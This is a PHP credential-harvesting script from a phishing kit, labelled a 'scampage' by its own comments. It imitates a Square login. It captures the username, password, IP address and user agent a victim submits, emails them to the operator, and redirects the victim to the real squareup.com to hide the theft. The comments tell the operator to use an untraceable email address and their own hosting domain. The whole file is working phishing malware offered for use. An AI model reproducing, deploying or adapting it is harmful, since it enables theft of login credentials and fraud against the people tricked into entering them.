 <?php

// CHANGE THE DATA'S INSIDE THIS TWO VARIABLES. MAKE SURE TO USE A WORKING EMAIL THAT CANT BE TRACED TO YOU DIRECTLY, ALSO PUT THE DOMAIN NAME YOU WILL BE USING TO HOST THIS SCAMPAGE
// IN THE "$WORKING_MAIL" VARIABLE, MAKE SURE NOT TO ADD THE "WWW" OR "HTTP" OR "HTTPS" PREFIX, USE THIS FORMATE => "your_working_email@yandex.com".
$YOUR_DOMAIN_NAME = "supercars.com"; // [CHANGE THIS] use this format, please dont add www or http or http
$WORKING_MAIL = "your_working_email@yandex.com"; // [CHANGE THIS]






// DONT CHANGE ANYTHING HERE!
$ORIGINAL_WEBSITE_HOMEPAGE_URL = "https://squareup.com/";
$USERNAME = $_POST["username"];
$PASSWORD = $_POST["password"];
$CLIENT_IP = get_client_ip();
$USER_AGENT = $_SERVER['HTTP_USER_AGENT'];
$ENGINE_START = TRUE;




IF($ENGINE_START === TRUE){
    $headers = "From: "."support@".$YOUR_DOMAIN_NAME;
    $to = $WORKING_MAIL;
    $subject = "DATA ALERT";
    $message  = "NEW USER DATA BELLOW. "
            . " . "."\n"."\n"
            . "USERNAME: $USERNAME"."\n"
            . "PASSWORD: $PASSWORD"."\n"
            . "IP ADDRESS: $CLIENT_IP"."\n"
            . "IP PING LINK:  http://www.geoiptool.com/?IP=$CLIENT_IP"."\n"
            . "USER AGENT: $USER_AGENT"."\n";
    mail($to, $subject, $message, $headers);
}

header("Location: $ORIGINAL_WEBSITE_HOMEPAGE_URL"); 































































































































// Function to get the client IP address
function get_client_ip(){
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

